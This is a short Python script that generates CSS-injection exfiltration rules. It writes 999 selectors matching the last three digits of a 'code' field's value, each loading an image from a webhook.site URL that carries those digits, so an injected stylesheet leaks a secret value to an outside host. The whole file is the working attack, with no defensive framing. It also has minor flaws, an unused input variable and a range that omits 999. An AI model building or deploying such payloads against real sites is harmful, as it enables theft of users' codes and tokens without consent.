domains = input("Enter ")
with open("rules.json", "a") as f:
    l = [str(i).rjust(3,"0") for i in range(0,999)]
    webhook = "https://webhook.site/280cd40a-12ef-4776-b720-8b1f6e79f5b2"
    for i in l:
        f.write(f'#code[value$="{i}"]{{list-style-image:url({webhook}/{i});}}\n')